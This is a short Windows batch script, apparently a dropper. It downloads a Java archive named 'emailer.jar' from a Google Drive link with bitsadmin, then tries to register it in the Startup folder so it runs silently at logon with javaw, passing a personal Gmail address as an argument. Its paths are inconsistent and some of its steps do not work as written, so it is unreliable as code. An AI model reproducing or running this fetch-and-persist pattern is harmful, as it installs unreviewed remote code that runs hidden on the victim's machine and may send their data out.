
bitsadmin.exe /transfer "Downloading Jar" /download /priority FOREGROUND "https://drive.google.com/uc?export=download&id=1QLzChUR8Qlb4zFlsoYBvYnKPASriX8Aq" "C:\Users\Public\Downloads\emailer.jar"

MOVE emailer.jar "C:\Users\Public\Downloads\emailer.jar"

echo "start javaw -Xmx200m -jar C:\Program Files (x86)\Emailer\emailer.jar maestromattaeus@gmail.com" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

echo "Complete"